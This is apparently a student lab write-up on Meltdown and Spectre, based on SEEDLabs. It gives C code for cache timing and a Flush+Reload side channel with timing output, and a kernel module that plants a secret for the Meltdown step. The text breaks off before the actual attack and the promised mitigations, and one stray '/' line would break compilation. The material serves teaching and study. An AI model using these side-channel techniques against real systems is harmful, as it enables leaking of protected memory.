# Meltdown and Spectre attack exploit

## Introduction

This report comprehensively examines Spectre and Meltdown vulnerabilities. Our goal is to dissect these vulnerabilities, offering a technical analysis of their underlying mechanisms. We will explore the "how" to understand the core principles and mechanisms facilitating these attacks. We will also investigate the "how to" by methodically deconstructing the techniques used for execution. Lastly, we will thoroughly examine "how to mitigate" these threats, explaining the strategies and defences in place to protect systems and valuable data.



## Requirements
> * Requires a machine that is susceptible to Meltdown & Spectre Attacks, prior to OS patch. A VM is provided **[here](https://seed.nyc3.cdn.digitaloceanspaces.com/SEEDUbuntu-16.04-32bit.zip)**
> * **Intel-based System**, this attack won't work on AMD Computers
> * Attack code (We used the code from **[SEEDLabs Security](https://seedsecuritylabs.org/Labs_16.04/System/Meltdown_Attack/files/Meltdown_Attack.zip)**)





# Meltdown Attack in C
Meltdown is a vulnerability that exploits the flaw inside the Intel CPUs, if the target machine is an AMD system, the attack will not work. 



### Step 1: Reading Cache vs Memory 

```c
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

uint8_t array[10*4096];

int main(int argc, const char **argv) {
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  // Initialize the array
  for(i=0; i<10; i++) array[i*4096]=1;
  // FLUSH the array from the CPU cache
  for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);
  // Access some of the array items
  array[3*4096] = 100;
  array[7*4096] = 200;
  for(i=0; i<10; i++) {
    addr = &array[i*4096];
    time1 = __rdtscp(&junk);   junk = *addr;
    time2 = __rdtscp(&junk) - time1;  
    printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
  }
  return 0; 
}
```

We ran this code on Ubuntu 16.04 on an Intel based System. To compile the following code:
```bash
gcc -march=native cachetime.c
```

Our results show the following output:
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161248795976290304/image.png?ex=65379c37&is=65252737&hm=a471a419cd6e1afc5068efa19ed6e2368148286ce8c984e3037bc47e74c55800&)

Notice that index 3 and 7 are accessed at a faster time compared to that rest. We can conclude that these indexes are cache in memory. To ensure consistency, we ran this program multiple times, our results given below: 
1.
```
Access time for array[0*4096]: 1632 CPU cycles
Access time for array[1*4096]: 346 CPU cycles
Access time for array[2*4096]: 348 CPU cycles
Access time for array[3*4096]: 60 CPU cycles
Access time for array[4*4096]: 340 CPU cycles
Access time for array[5*4096]: 336 CPU cycles
Access time for array[6*4096]: 530 CPU cycles
Access time for array[7*4096]: 62 CPU cycles
Access time for array[8*4096]: 336 CPU cycles
Access time for array[9*4096]: 346 CPU cycles
```
2.
```
Access time for array[0*4096]: 1642 CPU cycles
Access time for array[1*4096]: 332 CPU cycles
Access time for array[2*4096]: 318 CPU cycles
Access time for array[3*4096]: 58 CPU cycles
Access time for array[4*4096]: 378 CPU cycles
Access time for array[5*4096]: 350 CPU cycles
Access time for array[6*4096]: 394 CPU cycles
Access time for array[7*4096]: 58 CPU cycles
Access time for array[8*4096]: 394 CPU cycles
Access time for array[9*4096]: 402 CPU cycles
```
3.

```
Access time for array[0*4096]: 1540 CPU cycles
Access time for array[1*4096]: 408 CPU cycles
Access time for array[2*4096]: 372 CPU cycles
Access time for array[3*4096]: 52 CPU cycles
Access time for array[4*4096]: 378 CPU cycles
Access time for array[5*4096]: 1006 CPU cycles
Access time for array[6*4096]: 400 CPU cycles
Access time for array[7*4096]: 66 CPU cycles
Access time for array[8*4096]: 332 CPU cycles
Access time for array[9*4096]: 400 CPU cycles
```
4.

```
Access time for array[0*4096]: 1522 CPU cycles
Access time for array[1*4096]: 404 CPU cycles
Access time for array[2*4096]: 394 CPU cycles
Access time for array[3*4096]: 60 CPU cycles
Access time for array[4*4096]: 410 CPU cycles
Access time for array[5*4096]: 398 CPU cycles
Access time for array[6*4096]: 354 CPU cycles
Access time for array[7*4096]: 62 CPU cycles
Access time for array[8*4096]: 360 CPU cycles
Access time for array[9*4096]: 336 CPU cycles
```
5.
```
Access time for array[0*4096]: 1526 CPU cycles
Access time for array[1*4096]: 1274 CPU cycles
Access time for array[2*4096]: 402 CPU cycles
Access time for array[3*4096]: 64 CPU cycles
Access time for array[4*4096]: 392 CPU cycles
Access time for array[5*4096]: 396 CPU cycles
Access time for array[6*4096]: 408 CPU cycles
Access time for array[7*4096]: 58 CPU cycles
Access time for array[8*4096]: 330 CPU cycles
Access time for array[9*4096]: 324 CPU cycles
```
6.
```
Access time for array[0*4096]: 1702 CPU cycles
Access time for array[1*4096]: 346 CPU cycles
Access time for array[2*4096]: 402 CPU cycles
Access time for array[3*4096]: 68 CPU cycles
Access time for array[4*4096]: 420 CPU cycles
Access time for array[5*4096]: 416 CPU cycles
Access time for array[6*4096]: 428 CPU cycles
Access time for array[7*4096]: 68 CPU cycles
Access time for array[8*4096]: 412 CPU cycles
Access time for array[9*4096]: 408 CPU cycles
```
7.
```
Access time for array[0*4096]: 1648 CPU cycles
Access time for array[1*4096]: 342 CPU cycles
Access time for array[2*4096]: 336 CPU cycles
Access time for array[3*4096]: 82 CPU cycles
Access time for array[4*4096]: 358 CPU cycles
Access time for array[5*4096]: 542908 CPU cycles
Access time for array[6*4096]: 362 CPU cycles
Access time for array[7*4096]: 78 CPU cycles
Access time for array[8*4096]: 626 CPU cycles
Access time for array[9*4096]: 350 CPU cycles
```
8.
```
Access time for array[0*4096]: 1560 CPU cycles
Access time for array[1*4096]: 328 CPU cycles
Access time for array[2*4096]: 382 CPU cycles
Access time for array[3*4096]: 52 CPU cycles
Access time for array[4*4096]: 400 CPU cycles
Access time for array[5*4096]: 390 CPU cycles
Access time for array[6*4096]: 390 CPU cycles
Access time for array[7*4096]: 68 CPU cycles
Access time for array[8*4096]: 392 CPU cycles
Access time for array[9*4096]: 386 CPU cycles
```
9.
```
Access time for array[0*4096]: 1538 CPU cycles
Access time for array[1*4096]: 336 CPU cycles
Access time for array[2*4096]: 362 CPU cycles
Access time for array[3*4096]: 54 CPU cycles
Access time for array[4*4096]: 352 CPU cycles
Access time for array[5*4096]: 406 CPU cycles
Access time for array[6*4096]: 408 CPU cycles
Access time for array[7*4096]: 56 CPU cycles
Access time for array[8*4096]: 396 CPU cycles
Access time for array[9*4096]: 1248 CPU cycles
```
10.
```
Access time for array[0*4096]: 1788 CPU cycles
Access time for array[1*4096]: 350 CPU cycles
Access time for array[2*4096]: 336 CPU cycles
Access time for array[3*4096]: 76 CPU cycles
Access time for array[4*4096]: 324 CPU cycles
Access time for array[5*4096]: 334 CPU cycles
Access time for array[6*4096]: 334 CPU cycles
Access time for array[7*4096]: 76 CPU cycles
Access time for array[8*4096]: 330 CPU cycles
Access time for array[9*4096]: 418 CPU cycles
```


### Step 2: Side Channel attack via Cache

For meltdown to work we use the cache as a side channel.
Cache side-channel attacks exploit the timing differences that are introduced by the caches. 

An attacker will frequently flush a targeted memory location using ```clflush```


For example, let's assume that there is a victim function that uses a secret value as the index to load such values from an array and that the secret value cannot be accessed from user level memory. 



The sample code below describes the Flush+Reload technique to obtain the secret value:

```c
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

uint8_t array[256*4096];
int temp;
char secret = 94;
/* cache hit time threshold assumed to be below 80 given previously our access time(s) for index 3 and 7 were <80 */
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Victim function that uses the secret value (94)
void victim()
{
  temp = array[secret*4096 + DELTA];
}

/
void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
   addr = &array[i*4096 + DELTA];
   // Time measurement of accessing the memory address.
   // Lower times are likely possibilities of it being cached.
   time1 = __rdtscp(&junk);
   junk = *addr;
   time2 = __rdtscp(&junk) - time1;
   
   if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
   }
  } 

}

int main(int argc, const char **argv)
{
  flushSideChannel();
  victim();
  reloadSideChannel();
  return (0);
}
```


**Code Compilation**
```
gcc -march=native FlushReload.c -o FlushReload
```


#### Results:
![Image2](https://cdn.discordapp.com/attachments/1131246972372791429/1161250215957909564/image.png?ex=65379d8a&is=6525288a&hm=930ef633fd8a5d7bedd4f37cbb02659cb44cf447023b802a5c9dc721a0d3469d&)

We get the value of secret based off side-channel attack by exploiting the cache time. Again, if the target computer is not running on an Intel CPU, this attack will not find the secret. In addition, to measure the accuracy, run the program multiple times to see the consistency of finding the secret.   

### Explanation:

**global variables**
> In the provided code, there are several global variables that play crucial roles in the program's functionality. Firstly, the uint8_t array[256*4096] is a global array of 1 megabyte in size, serving as the main data structure for cache timing measurements. The int temp variable is used to store the value retrieved from the array in the victim function. The char secret = 94 represents a secret value that the code aims to leak through cache timing analysis. The CACHE_HIT_THRESHOLD constant, set to 80, establishes the time threshold for determining whether a memory access is a cache hit or miss. Finally, the DELTA constant, defined as 1024, is an offset used to calculate memory access indices within the array. These global variables collectively define the key parameters and data structures necessary for the cache timing attack performed by the program, enabling it to measure and potentially reveal cached elements and the secret value.

**flushSideChannel()**
> The function in the provided code is responsible for ensuring that the array data is in physical RAM and not solely cached, while also flushing the cached copies of this data. It accomplishes this in two main steps. First, it iterates over the elements in the array and writes the value 1 to each of them. This action brings the data into RAM, ensuring it is not kept in a copy-on-write state, which could be shared across multiple processes. Second, it employs a loop to flush the cache for each of these elements using the _mm_clflush instruction. By doing so, it clears any cached copies of the array from the CPU cache. The purpose of this function is to prepare the array for cache timing measurements in the subsequent reloadSideChannel() function, ensuring that subsequent memory access measurements are based on data fetched from RAM, which is critical for the cache timing attack to work effectively.


**reloadSideChannel()**
> The reloadSideChannel() function in the provided code is the core component of a cache timing attack. It is designed to measure the time it takes to access specific memory locations within the array. This function iterates over 256 elements of the array and, for each element, records the time it takes to access that location using the __rdtscp function. If the access time is less than or equal to a predefined CACHE_HIT_THRESHOLD, it infers that the corresponding element is cached. It then prints the index of the cached element, effectively revealing which elements of the array were cached due to previous accesses. This function is used to exploit cache behavior to potentially leak sensitive information, as it identifies which elements are cached based on the timing of memory accesses.


### Step 3: Meltdown Attack preparation

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/vmalloc.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

static char secret[8] = {'S','E','E','D','L','a','b','s'};
static struct proc_dir_entry *secret_entry;
static char* secret_buffer;

static int test_proc_open(struct inode *inode, struct file *file)
{
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4,0,0)
   return single_open(file, NULL, PDE(inode)->data);
#else
   return single_open(file, NULL, PDE_DATA(inode));
#endif
}

static ssize_t read_proc(struct file *filp, char *buffer, 
                         size_t length, loff_t *offset)
{
   memcpy(secret_buffer, &secret, 8);              
   return 8;
}

static const struct file_operations test_proc_fops =
{
   .owner = THIS_MODULE,
   .open = test_proc_open,
   .read = read_proc,
   .llseek = seq_lseek,
   .release = single_release,
};

static __init int test_proc_init(void)
{
   // write message in kernel message buffer
   printk("secret data address:%p\n", &secret);      

   secret_buffer = (char*)vmalloc(8);

   // create data entry in /proc
   secret_entry = proc_create_data("secret_data", 
                  0444, NULL, &test_proc_fops, NULL);
   if (secret_entry) return 0;

   return -ENOMEM;
}

static __exit void test_proc_cleanup(void)
{
   remove_proc_entry("secret_data", NULL);
}

module_init(test_proc_init);
module_exit(test_proc_cleanup);
```


```shell
$ make
$ sudo insmod MeltdownKernel.ko
$ dmesg | grep 'secret data address'
```

Output:
![Image3](https://cdn.discordapp.com/attachments/1131246972372791429/1161265381206405170/image.png?ex=6537abaa&is=652536aa&hm=9e9d5df99b8fd3ff86d32e5559e3c8bc287dea0647a02d987a570629938f82f0&)






#### Step 4: Out-of-Order Execution
